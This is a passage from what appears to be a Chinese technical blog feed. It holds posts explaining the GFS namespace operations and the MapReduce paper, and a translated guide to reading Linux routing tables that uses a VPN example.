操作。根据我的理解，这些操作可以被划分为三组，具体见下表：</p><table><thead><tr><th>组编号</th><th>操作</th><th>主要被操作的组件</th></tr></thead><tbody><tr><td>1</td><td>open/close</td><td>Client</td></tr><tr><td>2</td><td>create/delete/snapshot/rename</td><td>Master</td></tr><tr><td>3</td><td>read/write/record append</td><td>ChunkServer</td></tr></tbody></table><p>为什么这样区分呢？且听我细细道来。</p><h2 id="第1组"><a href="#第1组" class="headerlink" title="第1组"></a>第1组</h2><p>对于 open/close 操作，论文中并没有过多的提及，但我们前面提到为了优化性能，Client 会缓存一些信息。比如在读取时，它会通过 Master 查询“文件 A 的第 X 个 Chunk 在哪”这样的信息，并以文件名+Chunk下标作为键进行缓存，缓存的过期方式有两个，其一是达到了设置的过期时间，其二就是重新打开这个文件。对于重新打开文件这一点，论文 2.7.1 节中的描述是 <code>which purges from the cache all chunk information for that file</code>。基于这一点，我推测文件的打开和关闭操作主要影响的是客户端，比如 open 操作用于在客户端建立对应文件的缓存结构，而 close 操作将这个结构释放掉。</p><p>我没有在论文中找到类似排他打开的操作，如果 GFS 支持这种操作，那么 open/close 必然要通知到 Master。与之类似的，如果 GFS 可以避免文件在打开时被删除，那么这两个操作也同样需要被通知到 Master。</p><h2 id="第2组"><a href="#第2组" class="headerlink" title="第2组"></a>第2组</h2><p>我们前面提到，Master 中保存了文件到 Chunk 的映射。这里所谓的文件，其实就是 /x/y/z 这样的一个字符串，GFS 并没有常规文件系统中的目录的结构（这种结构中记录了目录中的内容），所以我认为在实现上Master 的这种映射关系保存成 kv 存储也没问题，但是出于减小体积、加快查找速度、方便恢复（详见后文）等方面的考虑，GFS 将文件路径组织成树状结构，并称其为 Namespace。在这棵树上的每个节点都有一对锁，分别是 read 锁与 write 锁，两种锁相互配合来避免并发的操作导致 Namespace 的混乱。这里的操作指什么呢，主要指的就是第二组中的内容。</p><h3 id="create-操作"><a href="#create-操作" class="headerlink" title="create 操作"></a>create 操作</h3><p>顾名思义，create 用于在 Namespace 中建立一个新的节点，论文中没有提到 create 的流程，但我认为如果仅仅是 create 文件，那并不需要立即为其创建一个 chunk，可以把 chunk 的创建延迟到到对这个文件执行写入时。前面提到 Namespace 中的每个节点都有一对锁，在 create 一个新节点时这对锁也会参与进来。具体来说，假设我们要创建 /home/hygao/file1，那么在创建的过程中 /home、/home/hygao 都会被加上 read 锁，而 /home/hygao/file1 会被加上 write 锁。这意味着，我们可以同时创建 /home/hygao/file2，因为 /home 和 /home/hygao 都是 read 锁，而 read 锁之间并不冲突，但我们不能同时创建 /home/hygao/file1，因为 /home/hygao/file1 已经被上了 write 锁，write 锁之间是相互冲突的。</p><h3 id="delete-操作"><a href="#delete-操作" class="headerlink" title="delete 操作"></a>delete 操作</h3><p>论文中重点介绍了删除文件的场景，但没怎么提及删除目录的场景（从论文 4.1 小节中可以推断出 GFS 是支持删除目录的），所以这里仅讨论删除文件的相关内容。GFS 的 delete 包括 Master 中元数据的删除以及对应 Chunk 的删除，整个过程需要和 Master 的垃圾回收功能相配合。</p><p>具体而言，当用户申请删除一个文件时，GFS 将这个文件 rename 为一个隐藏名（其实个人电脑的回收站也是这个原理），这个隐藏名中记录了删除时的时间戳。GFS 会定期扫描 Namespace，所以它可以知道这些被标记为“应该删除”的文件已经在“回收站”中保存了多久，而用户可以配置一个最大保存时间，超过这个时间的“应该删除”的文件就会真的执行删除，在此之前，用户可以通过将这些文件 rename 成普通文件的方式来避免它们被删除。所谓”真的执行删除“，就是将这个节点从 Namespace 中移除掉，这样该文件对应的 Chunk 就变成了孤儿（orphaned chunk），即没有任何一个文件引用它们，此时 Master 就可以向对应的 ChunkServer 发送指令，让它们删除掉对应的 chunk，从而释放硬盘空间。</p><p>这种机制的好处在于删除操作会非常快速（因为仅涉及 namespace 的操作），且误删时在一定时间内还可以将其快速恢复。与之相对的，坏处在于所谓的删除其实并没有立即释放出硬盘的空间，这在空间吃紧的情况下是非常无力的。如何解决这个问题呢？根据论文的描述，如果用户重复删除同一个文件，那么垃圾回收会被加速；此外，用户可以指定一个<strong>节点</strong>的删除策略，这样在用户执行 delete 时文件就会被立即删除并释放空间，这样的删除不可恢复，而这里提到的节点，其实就代表可以在目录和文件两个维度进行配置。</p><p>其实根据上面的描述，可以推测出还有第三种加速删除的方式，因为 GFS 判断文件在“回收站”里保存了多久是根据文件名中的时间戳，而用户首先可以访问这些文件，其次可以对其 rename，那只要修改掉文件中的时间戳，让 GFS 认为这个文件已经被保存很久了，就可以在下次垃圾回收时将它清理掉了:-P</p><p>此外由于在对文件操作时（比如后面的 snapshot）不能将其删除，所以可以推测 delete 也会给文件加上 write 锁。</p><h3 id="snapshot-操作"><a href="#snapshot-操作" class="headerlink" title="snapshot 操作"></a>snapshot 操作</h3><p>根据我的理解，snapshot 操作应该类似于个人电脑上对文件或文件夹的复制，复制后的文件或目录拥有与复制源相同的内容，但对复制后的内容的修改不会影响到复制源。GFS 支持目录和文件两个级别的 snapshot，不过论文中只介绍了文件级别的流程，所以这里也同样仅讨论文件的 snapshot 操作。GFS 对这个操作做了一些优化，具体包括 CoW 和本地复制。</p><p>CoW 也就是 copy-on-write，这项技术旨在尽可能复用已有的内容。在 GFS 的场景下，表现为当用户执行 snapshot 时，新的文件对应的 chunk 同样使用源文件的 chunk。也就是说，如果有文件 /file1，其对应的 chunk 为 A、B、C，那么对其执行 snapshot 创建文件 /file2 时，这个新文件对应的 chunk 同样是 A、B、C。由于 snapshot 出的新文件本身就拥有和源文件同样的内容，所以在用户对新文件执行 read 操作时不会感受到有什么问题。</p><p>但是写文件时就不一样了，如前所述，对新文件的修改不会影响到源文件，这要怎么做呢？就是 CoW，即用户对文件对应的某个 chunk 执行写入时，Master 会让 ChunkServer 复制一个新的 chunk 出来，并为其分配 chunk handle，再把这个新的 chunk handle 返回给客户端，此后客户端的写入请求都在这个新的 chunk 上生效，从而避免了对源 chunk 的影响。这里 Master 会认为需要创建一个新的 Chunk，是因为每个 Chunk 保存了一个引用计数，如果它大于 1，那么就说明需要创建新的 Chunk，创建后会将源 Chunk 的引用计数减一，因为此时被读取的文件已经引用了新的 Chunk。</p><p>那么本地复制指的是什么呢，其实这是我自己起的名字:-P。它实际表示的是，Master 在创建新的 chunk 时，会让源 chunk 所在的 ChunkServer 来创建这个新的 chunk，这样的好处在于 chunk 的复制不需要走网络，相关的 IO 都仅发生在磁盘上，根据论文，Google 的磁盘读写速度差不多是网络的 3 倍。但是这也会有一个问题，就是如果源 ChunkServer 上的磁盘容量不足以创建这个新的 chunk 该怎么办，我不清楚文件系统会不会对此做什么优化，不过论文中并没有对这种情况作出说明。</p><p>最后，根据 4.1 小节，snapshot 会给文件加上 write 锁，从而避免 snapshot 的过程中发生删除、创建新文件等。</p><h3 id="rename-操作"><a href="#rename-操作" class="headerlink" title="rename 操作"></a>rename 操作</h3><p>论文中并没有描述 rename 的流程，但是从 MapReduce 以及文中的一些描述我们可以推断 GFS 是支持这个操作的，而且这个操作是原子的。根据这一点，我推测 rename 操作会给源文件与目标文件加 write 锁。</p><p>而 rename 的原理应该就是节点内容的迁移，比如把 /file1 文件 rename 成 /file2，就是把 /file1 对应的 chunk 给 /file2，然后删除 /file1 这条记录，这个操作只涉及 Master，不会对 ChunkServer 产生影响。这里的删除指的是从 Namespace 中直接删掉，而不是前面提到的 delete 操作。</p><h2 id="第-3-组"><a href="#第-3-组" class="headerlink" title="第 3 组"></a>第 3 组</h2><p>最后一组就是最重要的操作了，因为它主要与 ChunkServer 进行交互，也就是完成对文件的读写，这是一个文件系统的核心能力。虽然这是 GFS 中最有趣的部分，但是为了避免这篇文章太长，所以这部分以及后续的内容就放在下一篇文章中来讨论吧:-)</p>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
          <category> 论文 </category>
          
          <category> 存储 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浅析批处理框架 MapReduce</title>
      <link href="/2022/06/23/MapReduce/"/>
      <url>/2022/06/23/MapReduce/</url>
      
        <content type="html"><![CDATA[<blockquote><p>论文<a href="https://pdos.csail.mit.edu/6.824/papers/mapreduce.pdf" target="_blank" rel="noopener">下载</a></p></blockquote><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近拜读了 Google 三驾马车中的 MapReduce，这个被发布在 2004 年的论文中介绍了一个工作在分布式文件系统 GFS 之上的“批处理”框架。尽管由于各种原因， Google 在很久前就声称内部不再使用 MapReduce 了，但因为这个框架非常经典，以及当前依然有很多系统将它作为执行引擎（比如一些框架在 MapReduce 上添加 DSL 来做声明式系统），我认为研究这个框架仍然具有很大的意义。</p><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>MapReduce 非常有趣的一点在于，它试图为使用者屏蔽掉分布式带来的<strong>大多数问题</strong>（没有完全屏蔽，因为 Partition 函数或 Combiner 函数都要求用户对任务在节点上的分布有一个明确的感知），诸如拆分输入、并行执行、错误处理、节点通信等底层的问题都由框架来处理。在使用上，它要求用户<strong>至少</strong>提供一个 Map 任务和一个 Reduce 任务，通常而言，Map 用于处理并行任务，而 Reduce 则将 Map 的输出进行聚合并产生最终的输出。</p><p>框架会将这些任务分配给集群中的多个节点来做分布式的执行。这里借用论文中提供的执行说明图，来简单阐述下框架的执行过程（结合论文 Appendix A 中的代码来看这幅图会更好一些，但由于篇幅原因，这里就不把相应的内容贴过来了）：</p><p><img src="/images/mapreduce1.png" alt="MapReduce 执行过程"></p><p>首先，对于一个任务而言，集群中存在 master 和 worker 两类<strong>节点</strong>（为了方便描述，这里将“分配到 master 程序的节点”称为 master 节点，worker 同理），顾名思义，master 负责协调任务的执行，worker 则是干活的。从论文提供的代码中可以看到，worker 的数量可以通过 <code>spec.set_machines(&lt;数量&gt;)</code> 来设置，不过注释中提到这里是设置“最多使用的机器数量”。与之相对的，master 则只有一个。</p><p>用户要做的任务是定义 Map 和 Reduce，然后声明输入文件和输出文件的名字，根据论文提供的代码，用户可以通过 <code>out-&gt;set_filebase(&lt;前缀&gt;)</code> 声明输出文件的前缀，比如 <code>out-&gt;set_filebase(&quot;/gfs/test/freq&quot;)</code>，而输出文件剩余的部分取决于 reduce 的数量，因为一个 reduce 对应一个输出文件。如果有 100 个 reduce，那么最终就会生成 /gfs/test/freq-00000-of-00100、/gfs/test/freq-00001-of-00100 这样的文件。不过不清楚为什么要从 0 开始，如果这样那么最后一个文件的名字可能就是 /gfs/test/freq-00099-of-00100，看起来怪怪的。</p><p>当用户定义了 Map 和 Reduce 任务后，master 会给 worker 分配任务，由于通常而言 map 和 reduce 的数量和都是大于 worker 的数量的，所以一个 worker 可能会被分配到多个任务。那么 map 和 reduce 的数量是如何确定的呢？对于 map 而言，数量是自动确定的。框架会把输入文件拆分成 16～64 MB 的一个个输入块（split），每个块的具体大小由用户控制。这样一来，只要知道输入文件的大小，就可以知道需要被分割成多少个输入块，而由于一个 map 任务处理一个输入块，所以 map 任务的数量也就知道了；与之相对的，reduce 任务的数量则由用户通过 <code>out-&gt;set_num_tasks(&lt;数量&gt;)</code> 自己定义。</p><p>Map 任务读取输入，根据配置好的规则将输入解析成一个一个的 Key-Value pair，然后用这个 k-v pair 作为入参调用用户提供的代码来产生输出，输出同样以 k-v pair 的形式表示，首先会被写入到内存中，然后由框架周期性地将这些结果写入到<strong>本地磁盘</strong>（注意和 GFS 的全局存储区分开）中。在写入的过程中会调用用户提供的分区函数对输出进行分区，比如 <code>hash(Key) % &lt;Reduce 任务的数量&gt;</code>，因此一个 map 任务可能会产生很多分区。map 任务产生的这些文件对应的位置会上报给 master 节点，然后 master 节点会将各个分区文件的位置发给对应的 reduce 任务。</p><p>当 reduce 任务收到 master 节点的通知时，它会通过 RPC 来从各个 map 任务那里拉取属于自己分区的文件。而当 reduce 任务拉取到所有的文件时，它会对这些文件中的 k-v pair 做排序，排序的结果使得所有具有相同 key 的 value 被聚合在一起，而 key 本身则也根据其语义被排序。对于排序本身而言，根据内存中是否能容纳所有的数据，reduce 任务会按需使用硬盘做辅助空间进行外部排序。</p><p>经过这样的处理后，框架会遍历排好序的结果，依次为其调用用户提供的 reduce 代码。代码接受一个 key 和一个迭代器作为参数，迭代器中的内容是属于这个 key 的所有 value，之所以要使用迭代器而不是一个简单的列表，是为了避免一个 key 中的所有 value 的数量过大，导致内存不能将其容纳进来。迭代器屏蔽了数据的来源，不管数据是来自于内存还是硬盘，在代码层面的处理都是相同的。</p><p>当分区中所有的内容都被用户提供的 reduce 任务处理后，就会在前文所述的输出文件中产生处理后的结果。而到此为止，整个 MapReduce 任务就结束了。</p><h1 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h1><p>前面描述了一次 MapReduce 任务的大概流程，在这个基础上，依然有一些细节问题值得探讨，下面按发生的顺序来一一阐述。</p><p>首先，Google 的 MapReduce 是运行在 GFS 集群上的，作为一个分布式的文件系统，GFS 将文件按 64 MB拆分成几个小块，并存储在不同的机器上，而这些机器很可能就被作为了 MapReduce 的 worker。这就给了框架进行优化的空间，具体来说，master 可以通过 GFS 获知到输入文件的布局，比如节点 A 上有文件块 B，而节点 A 又是一个 worker，那么 master 就可以把处理 B 的 map 分配到节点 A 上，这样 map 在读取输入块时就不需要通过网络来拉取数据，直接从本地就可以获取到，从而节省了不必要的网络传输。</p><p>其次，map 在读取输入时，实际上读取到的是经过拆分的输入块，该输入块的大小由用户来定义。但是，考虑这样一种情况，假设用户将输入块的大小定义为 16MB，但是这个输入块中最后一条记录是不完整的，对于这整条记录而言，它的前半部分在这个输入块中，而后半部分在下一个输入块中。在这样的情况下，如果依然严格按照 16MB 进行拆分，那么这两个输入块对应的 map 任务都会因为这条不完整的记录而出现问题。对于这个问题，论文 4.4 节表示输入是被一种叫做 reader 的组件来拆分的，而 reader 是知道如何将文件拆分成有意义的记录的（原文：<code>Each input type implementation knows how to split itself into meaningful ranges for processing as separate map tasks</code>），所以我猜测在 reader 这一层面会根据具体的需求灵活地分隔文件，也即前文所述的 16～64 MB 的限制并不是一个硬性限制。</p><p>然后，用户可以提供 Partition 函数来帮助 map 决定输出的内容需要被存储的位置。除此之外，用户还可以提供 Combiner 函数。关于这个组件的作用，论文 4.3 节有详细的描述，可以简单地将其理解为一种预处理。论文提供的代码中，被用作 reduce 任务的内容同样被作为了 combiner，这意味着 combiner 函数在执行前，map 产生的内容应该是被排好序的。如论文 4.2 节所言，给定一个分区，内部的 key 是有序的。那么结合 combiner 来看，这个有序就不仅指 reduce 收到的完整的 partition 内容是有序的，对于 map 产生的部分 partition，内部的内容也同样是有序的才对。</p><p>接着，MapReduce 提供一种备份任务机制。具体而言，当 MapReduce 过程近乎完成时，框架会把那些尚未完成的任务分配给空闲的 worker，这样同样的任务就有可能被多个 worker 执行，而任意一个 worker 执行成功，master 都会认为这个任务执行成功，从而避免某个 worker 因为<strong>各种外部原因</strong>（比如硬盘老化导致写入时要不停地进行纠错从而降低写入速度）拖慢整个 MapReduce 的执行速度。</p><p>最后，一些特殊的输入可能导致 map/reduce 任务异常退出，这可能是因为用户的代码有 bug，也可能是因为记录本身有问题。要避免因为这种问题导致 MapReduce 无法正常完成，最好的解决办法当然是找出 bug 或记录的问题，但除此之外，框架也允许用户跳过这个会导致问题的记录。具体而言，框架提供了一种特殊的运行模式，在这种模式下，如果 map/reduce 任务异常退出，那么 master 可以感知到是因为哪条记录，然后重新把任务分配给 worker 让其重新执行，如果这次执行同样发生了异常退出，那么 master 在下一次分配这个任务时会告知 worker 跳过这条有问题的记录，从而避免流程进入 执行-异常退出-执行 的死循环中。</p><h1 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h1><p>尽管在使用上基本类似于单机框架，但 MapReduce 本质上是作用在分布式环境下的，对于一个分布式系统而言，错误处理永远是一个特别重要的话题。下面来探讨下 MapReduce 框架是如何进行错误处理的。</p><p>在深入机制之前，我们首先要明确 MapReduce 是一个批处理框架，这意味着实时性并不是特别重要，如果用户提交了一个任务，需要几分钟乃至几个小时才能执行完成，这都是一个非常正常的情况。也正因为如此，MapReduce 的错误处理非常简单，最核心的就是<strong>重试</strong>。</p><p>因为需要重试，所以 map/reduce 任务的类型是有限的，根据论文的描述，它应该是确定性（deterministic）的，也就是说，同一个任务不论执行多少次，产生的输出都应该是一样的。除此之外，我认为任务本身还应该是幂等的，这意味着类似“每处理一条记录就写一条日志来标识”的操作是有问题的，因为重试很可能导致某条记录对应的日志不唯一。</p><p>在机制上，master 节点会定期地 ping 一下所有的 worker 节点，如果某个节点没有回复响应，那么 master 就将这个 worker 标记为异常，然后将它上面运行的所有任务在正常的 worker 上重新执行。那么，重试对整个执行流程有什么影响吗？答案是没什么影响，我们分别针对 map 和 reduce 来讨论。</p><p>首先对于 map 而言，master 有这样一条限制：如果已经从一个 map 获取到了其上报的中间文件信息，且这个 map 所在的 worker 是正常的，那么会忽略不同 worker 上的同一个 map 上报的信息。这条限制也是前文所述的备份任务得以正常执行的前提。因此，如果一个 map 所在的 worker 异常了，那么 master 会将同样的 map 分配给其他的 worker，即便后面这个 worker 恢复了，master 也会从这两份 map 上报的信息中选择更早的那一份作为最终的文件路径。如前所述，这些输出文件是被保存在 map 所在 worker 自己的本地磁盘上的，所以只要两个 map 所在的 worker 不同，产生的文件就互不影响。而确定了最终的文件路径后，master 会将其通知给所有的 reduce，这时如果哪个 reduce 没有获取或尚未获取完这个 map 对应的输出文件，那么将继续从这个新的 worker 上拉取对应的输出文件。</p><p>然后是 reduce，为了避免因为重试导致的多个 reduce 实例一起写入同一个最终输出文件（例如 /gfs/test/freq-00001-of-00100），每个 reduce 实际上是先写一个相互隔离的临时文件的。也就是说，即便是同一个 reduce 任务的不同实例，写入的临时文件也是不同的。在整个 reduce 任务完成后，框架将这个临时文件更名为最终输出文件的名字，而对于 GFS 而言，更名操作是原子性的，这就保证了最终输出文件的完整性。</p><p>但是仔细考虑 reduce，会发现很可能最终 MapReduce 执行完成后，GFS 上因为重试而保存了多份同样的内容，其中之一作为最终的输出文件，剩下的都是临时文件，这显得有些冗余。但是，其实 GFS 本身保证写入操作的一致性就是“至少一次”，也就是说，使用 GFS 写入文件时（实际上是追加写），本身就可能产生多份重复的内容，只不过在读取时不会感知到。因此，MapReduce 导致的这份“冗余”，在这样的环境下就显得合情合理了。</p>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
          <category> 论文 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【好文翻译】如何解读路由表中的信息</title>
      <link href="/2022/06/11/Interpreting-Routing-Table/"/>
      <url>/2022/06/11/Interpreting-Routing-Table/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为了了解 <code>ip route</code> 命令显示的信息有什么含义，以及它对 Linux 收发网络包的影响，我在网络上搜索了很多文章，但是这些文章多数都仅仅是按序描述每个字段的作用，没有通过具体的例子来加深印象。偶然间，在 Diego Assencio 大大的个人网站里发现了<a href="https://diego.assencio.com/?index=d71346b8737ee449bb09496784c9b344#:~:text=On%20Linux%2C%20there%20are%20two%20commands%20which%20are,the%20ip%20command%2C%20open%20a%20terminal%20and%20run%3A" target="_blank" rel="noopener">这篇文章</a>，拜读之后感觉收获颇丰。</p><p>这篇文章给出了两个例子，第一个例子是常见的网络访问，第二个则是在 VPN 环境下的网络访问，通过阅读这篇文章，至少对于我而言有种茅塞顿开的感觉，尤其是后面 VPN 的例子，读完后就能更好地了解容器网络或虚拟机网络的实现方式。</p><p>所以本文尝试翻译 Diego Assencio 的文章，一方面做一个初次翻译的尝试，一方面备份在这里方便未来自己的阅读，侵删。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>这篇文章将会描述如何解读 Linux 系统中路由表的信息。所谓路由表其实就是一个包含了许多路由规则的表单，网络包会根据它的目的地址来选择使用其中的哪条规则。</p><p>为了更好地理解这篇文章描述的内容，读者必须先理解两件事情：<strong>CIDR 表示法</strong>（这东西以 <code>&lt;network-prefix&gt;/&lt;netmask-length&gt;</code> 的格式来声明一个 IP 地址的子网）以及<strong>最长前缀匹配算法</strong>（译者注：事实上，对 tun/tap 设备的了解也是必须的，这对于理解下文 VPN 的例子尤其重要）。如果读者目前还不了解它们，请先花一些时间来学习，然后再继续阅读本文。此外，我们接下来要描述的例子都基于 IPv4 网络，但是相关的概念对 IPv6 网络也同样适用。</p><p>在 Linux 系统上，主要有两个命令用于获取路由表信息：<strong>route</strong> 和 <strong>ip</strong>。本文将使用 ip 命令，因为它输出的内容比 route 命令更加易于解读。为了使用 ip 命令来显示操作系统中路由表的内容，请打开一个终端模拟器（terminal），然后运行下面的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route show</span><br></pre></td></tr></table></figure><p>这个命令的输出取决于机器的网络配置以及实际的网络拓扑。比如让我们来考虑一个通过无线网络连接到路由器以访问外部网络的机器，机器的 IP 地址为 192.168.1.100，而路由器的地址为 192.168.1.1，那么 ip 命令的输出就有可能如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">default via 192.168.1.1 dev wlan0</span><br><span class="line">192.168.1.0/24 dev wlan0  proto kernel  scope link  src 192.168.1.100</span><br></pre></td></tr></table></figure><p>让我们从第二行开始解读这个输出。这一行表示“任何被发往 192.168.1.0/24 这个网络的包都会以 192.168.1.100 作为源地址，然后被 wlan0 这个设备发送出去”，192.168.1.100 这个地址是 DHCP 服务端为 wlan0 设备分配的地址。而剩下的部分则可能不那么有趣：<code>proto kernel</code> 表示这条路由是被操作系统内核在自动配置期间创建的；而 <code>scope link</code> 则表示在 192.168.1.0/24 这个网络中的目标地址都仅对 wlan0 这个设备有效。</p><p>而这个输出中的第一行则表示所有网络包的默认路由（即，当没有其他路由可以被使用时，网络包将使用这一条路由）。具体含义指网络包将被 wlan0 设备发送到默认网关（译者注：通常就是指家用路由器），而这个网关的地址是 192.168.1.1。</p><p>ip 这个命令的输入非常灵活，例如可以只输入命令的一部分，然后这个输入就会被 ip 命令自动在内部进行补全。举例来说，下面所有的命令实际上都是等价的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ip r s</span><br><span class="line">ip r show</span><br><span class="line">ip ro sh</span><br><span class="line">ip route show</span><br></pre></td></tr></table></figure><p>接下来让我们来考虑一个更复杂的例子，当设备连接到一个虚拟专用网络（VPN）时，所有网络流量都会经过一个加密隧道（tunnel）被发送到 VPN 服务端。我们以一个 OpenVPN 的网络作为例子，在这个例子中，我们有如下设备及其 IP 地址：</p><ul><li>tun0：192.168.254.10</li><li>wlan0：192.168.1.100</li><li>路由器：192.168.1.1</li><li>OpenVPN 服务端：95.91.22.94</li></ul><p>一个网络包在被发往目的地的途中会经历如下的流程：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原始网络包 --&gt; tun0 -加密后的网络包-&gt; wlan0 --&gt; 路由器 --&gt; OpenVPN 服务端 -解密后的网络包-&gt; 目的地</span><br></pre></td></tr></table></figure><p>首先，一个虚拟网络设备（通常叫做 tun0）会被创建，然后一些路由信息会被加入到路由表中，这些信息引导<strong>几乎所有</strong>的流量经过 tun0 这个设备，在这里网络包会被加密，然后最终通过 wlan0 这个网络设备被发送到 OpenVPN 的服务端。</p><p>下面是一种可能的路由表输出，这个输出来源于一个已经连接到 OpenVPN 服务端的设备（也就是 OpenVPN 的客户端）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0.0.0.0/1 via 192.168.254.9 dev tun0</span><br><span class="line">default via 192.168.1.1 dev wlan0</span><br><span class="line">95.91.22.94 via 192.168.1.1 dev wlan0</span><br><span class="line">128.0.0.0/1 via 192.168.254.9 dev tun0</span><br><span class="line">192.168.1.0/24 dev wlan0  proto kernel  scope link  src 192.168.1.100</span><br><span class="line">192.168.254.0/24 via 192.168.254.9 dev tun0</span><br><span class="line">192.168.254.9 dev tun0  proto kernel  scope link  src 192.168.254.10</span><br></pre></td></tr></table></figure><p>直接解释这个路由表中的所有细节显得有些单调乏味，所以我们将关注这些输出中的重点部分。请注意第二行：这个设备上的默认路由并没有发生变化。然而，第一行和第四行引入了两条新的路由规则，这将完全改变游戏的规则：被发送到 0.0.0.0/1 和 128.0.0.0/1 两个网络的所有网络包都会经过 tun0 设备，并且以 192.168.254.9 作为网关的地址。</p><p>这里需要注意的是，0.0.0.0/1 和 128.0.0.0/1 分别匹配目标地址的第一个比特位为 0 和 1 的网络包。当它们一起工作时，就可以<strong>代替第二行的规则成为新的默认路由规则</strong>。因为对于任何一个网络包而言，它的目标地址的第一个比特位不是 0 就是 1，而根据<strong>最长前缀匹配算法</strong>，网络包将优先选择这两条规则（译者注：可以认为 default 路由中目标地址子网掩码的长度为 0）。因此，当 OpenVPN 进程为主机创建了这两条路由后，所有的网络包都会默认被发往 tun0 设备，而从这里开始，网络包就会被加密发送到 95.91.22.94（OpenVPN 服务端的地址）。显而易见，上面输出中的第三行描述了这部分内容：被发往 95.91.22.94 的网络包都由 wlan0 设备以 192.168.1.1 作为网关发出。</p><p>一些读者可能会好奇上面的输出中 192.168.254.9 这个地址，那么它是怎么来的呢？事实上，OpenVPN 在创建 tun0 设备时是以 point-to-point 模式创建的，这意味着这个设备在工作时就好像直接连接在另一端上（译者注：也就是不需要通过中间路由器进行转发），而这个 192.168.254.9 就是另一端的设备，它实际上就是 OpenVPN 的服务端。服务端负责创建 192.168.254.0/24 这个虚拟网络，然后从地址池中选出空闲的 IP 地址分配给那些连接到自己的主机。如上面输出的最后一行所示，192.168.254.10 就是这个路由表所在的主机被分配到的地址，而 192.168.254.9 则是服务端在这个虚拟网络中的地址。</p><p>读者可以通过运行下面的例子来更清晰地证明上面的描述：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr show dev tun0</span><br></pre></td></tr></table></figure><p>对于我们的例子而言，这条命令的输出可以非常清晰地展示前文所述的 point-to-point 连接（注意倒数第二行）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">21: tun0: &lt;POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100</span><br><span class="line">    link/none</span><br><span class="line">    inet 192.168.254.10 peer 192.168.254.9/32 scope global tun0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>这篇文章描述了两个路由表影响网络包收发的例子，如果读者不了解 tun/tap 设备，在阅读 VPN 部分时可能会比较吃力。</p><p>简单来说，这种设备可以由系统中的某一个进程打开，然后进程可以选择读取或写入这个设备，如果有网络包被发送到这个设备，那么进程就可以从中读取到数据，和常规的 socket 不同的是，tun 设备可以读取到 IP 层的内容，tap 设备则可以读取到链路层的内容。所以如果进程在收到网络包后将它包装在一个常规的 tcp 或 udp 包中，再经过物理网卡发送到外部网络的某台主机上，那么这台目标主机在解包后就可以看到原始的 IP 包或链路层的内容，从而好像内部的这个网络包直接到达了主机上，以此营造出源主机和目标主机在这个内部网络包层面是相互可达的假象，这种虚拟化技术被叫做 Overlay 网络，如今被广泛运用于容器或虚拟机技术中。</p><p>于是在上面 VPN 的例子中，192.168.254.0/24 实际上就是内部网络包的源地址与目的地址所属的网络，而 OpenVPN 的实际网络地址其实是 95.91.22.94，也就是说，如果没有 OpenVPN 创建的 tun 设备，主机通过正常的网络只能访问 95.91.22.94 这个地址。</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>我的大学老师曾对我说，计算机领域要研究的内容总是离不开计算、存储和网络，这句话在近期深入学习容器技术的过程中不断出现在我的脑海里。 Diego Assencio 大大的原文中让我眼前一亮的其实就是 VPN 这个例子，它也是 flannel 项目最初实现的 udp 后端的核心原理，帮助我理解了更多网络方面的有趣知识。笔者对这篇文章的出现表示衷心的感谢。</p>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浅谈 Http Chunked Encoding</title>
      <link href="/2022/05/04/HTTP-Chunked-Encoding/"/>
      <url>/2022/05/04/HTTP-Chunked-Encoding/</url>
      
